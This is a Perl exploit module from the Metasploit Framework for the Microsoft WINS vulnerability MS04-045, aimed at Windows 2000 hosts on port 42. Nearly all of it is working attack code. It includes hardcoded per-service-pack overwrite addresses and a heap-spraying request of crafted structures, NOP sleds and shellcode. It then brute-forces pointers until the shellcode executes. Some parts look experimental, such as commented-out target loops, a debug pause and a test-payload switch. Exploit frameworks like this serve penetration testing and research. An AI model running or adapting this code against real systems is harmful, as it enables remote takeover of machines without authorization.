
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wins_ms04_045;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;
use Pex::Utils;
use Pex::Text;

my $advanced = 
{
	'BASE'	=> [0, 'Specify the exact address to the structure'],
	'TARG'	=> [0, 'Specify the exact address to overwrite'],
	'WHAT'	=> [0, 'Specify the data used to overwrite the address'],
	'INT3'	=> [0, 'Switch to a payload of x86 debug interrupts'],
};

my $info =
{
    'Name'  => 'Microsoft WINS MSO4-045 Code Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST'  => [1, 'ADDR', 'The target address'],
                    'RPORT'  => [1, 'PORT', 'The target port', 42],
                },

    'Payload' => {
                     'Space'  => 3000,
                     'BadChars'  => '',
					 'Keys'      => ['+ws2ord'],
					 'PrependEncoder'	=> "\xcc",					 
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
        This module exploits a arbitrary memory write flaw in the WINS service, this vulnerability
        was originally found by Immunity.
    }),
                
    'Refs'  =>   [  
                 #   ['OSVDB',   5248],
                    ['MSB',     'MS04-045'],
                 ],
    'Targets'   =>
                 [
                   ['Windows 2000 Stack Brute 0', 0x05391eac, 0x0580f500, 0x0580e000 ],
				   ['Windows 2000 Stack Brute 1', 0x05391eac, 0x053df500, 0x053df000 ],
                   ['Windows 2000 Func Brute' , 0x05391eac,  0x1025500,  0x1023000 ],
                   ['Windows 2000 SP1 Func'   , 0x05391eac,  0x102537c,  0x102537c ],				   
				   ['Windows 2000 SP0 WS2'   , 0x05391eac,  0x750417ac,  0x750417ac ],
                   ['Windows 2000 SP1 WS2'   , 0x05391eac,  0x750417c4,  0x750417c4 ],
				   ['Windows 2000 SP2 WS2'   , 0x05391eac,  0x750407c4,  0x750407c4 ],
                 ],
    'Keys'  =>  ['wins'],                 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Replicate {
	my $self = shift;
	my $targ = shift;
	my $what = shift;

	# alignment magic only allows 8 bytes of contiguous data
	my $data = pack('V10',
		0x41414141,
		$what,
		$targ - 0x48,
		$what,
		$what,
		0x33333333,
		0x43434343,
		0x44444444,
		0x45454545,
		0x46464646,
	);
	
	return $data;
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $target_name = $self->GetVar('NBNAME');
    
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
   
    if (! $self->InitNops(128)) {
	    $self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $req;

	my $base = $target->[1];
	my $addb = $target->[2];
	my $adde = $target->[3];
	
	my $boom = $base + 45000 + 44;


	my @targets;


	for (my $start = 0x75025080; $start > 0x75025000; $start -= 8) {
		#push @targets, $start;
	}

	for (my $start = 0x053df400; $start < 0x053dff00; $start += 8) {
		# push @targets, $start;
	}

	# wins.exe function table
	for (my $start = 0x1023000; $start <= 0x1024000; $start += 8 ) {
		#push @targets, $start;
	}

	#for ('A' .. 'Z') {
	 	#push @targets, unpack('V', $_ x 4);
	#}



	# ws2_32 locking pointers (dangerous)
	push @targets, 0x750417ac; #SP0
	push @targets, 0x750417c4; #SP1
	push @targets, 0x750407c4; #SP2
	push @targets, 0x750417c4; #SP4
		
	
	# Fake target needed to supply what address of last target in the chain
	push @targets, 0xd00df00d;


	# Each valid base pointer, but invalid structure, results in a new structure
	# being added to the base pointer. These structures are 40 bytes long. 
	
	# We can guarantee that our data will always be aligned at 40 byte boundaries,
	# so we generate a set of structures that wrap into each other and will always
	# have (40 * count) + 4 pointing to the where pointer. 	
	
	##
	# Step 1
	# ======
	#
	# Pad the beginning of the request with 200 40-byte structures with benign data.
	# This will let us attack a server that has already had the base address grown
	# by up to 100 structures.
	#
	##
	
	# Prevent the base from growing by using a valid address
	# 0x20000 = global process information segment
	$req = $self->Replicate(0x00020fe4 - 4, unpack('V', 'MSF!')) x 200;
	
	# This should always point at the first where address in the padding buffer
	my $brute_base = $base + (198 * 40) + 4;
	# XXX 100 == production

	$self->PrintLine(sprintf("[*] The brute force base address is 0x%.8x", $brute_base));
		
	##
	# Step 2
	# ======
	#
	# Assume that our data starts at BASE + 100 * 40. This should always be the case
	# as long less than 100 exceptions have already occured in the wins.exe process.
	# Create structures that will iterate thorugh all of the target addreses. We will
	# later scan through these structures with additional requests.
	#
	##	
	
	# Iterate through all target addresses, adding a structure to the request for
	# each one of them. Since the first eight bytes of the target address will be
	# overwritten by a dword and then the next target address, we will write to 
	# eight bytes before the target and only increment by eight byte chunks. 
	
	foreach my $targ (@targets) {
		$req .= $self->Replicate($targ - 8, $boom);
	}


	##
	# Step 3
	# ======
	#
	# Determine how much space is left to fill between the brute force structures and
	# the beginning of the payload itself. Fill in this data and then append as many
	# bytes of nops as we account for in padding structures. Finally, append our 
	# payload to the end of these nops.
	#
	##		

	my $diff = 45000 - length($req);

	if ($diff <= 0) {
		$self->PrintLine("[*] Internal error, brute force buffer is too large.");
		return;
	}
	
	my $test = "\xcc";
	while (length($test) < length($shellcode)) {
		for (0 .. 255) {
			$test .= chr($_);
		}
	}
	# $shellcode = substr($test, 0, length($shellcode));
	
	$req .= "\x90" x $diff;
	$req .= $self->MakeNops(100 * 40);
	$req .= $shellcode;
	$req .= ("END!" x 256);
	
	
	
	##
	# Step 4
	# ======
	#
	# Place our request into memory, using an invalid structure pointer.
	#
	##		
	
	my $pkt = pack('NNN', length($req) - 8, -1, 0xdeadface). $req;
	$self->PrintLine("[*] Initializing the attack...");
	my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host,
        'PeerPort'  => $target_port,
    );

    if ($s->IsError) {
        $self->PrintLine("[*] Socket error: " . $s->GetError());
        return(0);
    }

	$s->Send($pkt);



	##
	# Step 5
	# ======
	#
	# Brute force through our structure list, starting at the heap base plus the padding
	# offset, plus 4. Increment this pointer by 40 bytes until we run out of addresses
	# or we get a shell. 
	#
	##		
		
	my $brute = $brute_base;
	my $brute_max = $brute_base + (100 * 40) + scalar(@targets);
	
	while ($brute < $brute_max)
#	foreach my $brute (@targets)
	{

		my $pkt = pack('NNN', 8, -1, $brute);
		
		$self->PrintLine(sprintf("[*] Targeting structure at 0x%.8x of 0x%.8x...", $brute, $brute_max));

		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);

    	if ($s->IsError) {
        	$self->PrintLine("[*] Socket error: " . $s->GetError());
        	<STDIN>;
			next;
    	}

		$s->Send($pkt);	
		
		$brute += 40;
		select(undef, undef, undef, 0.10);
	}
	sleep(2);
	
	$self->PrintLine("[*] Unable to exploit target");
	return;
}


1;

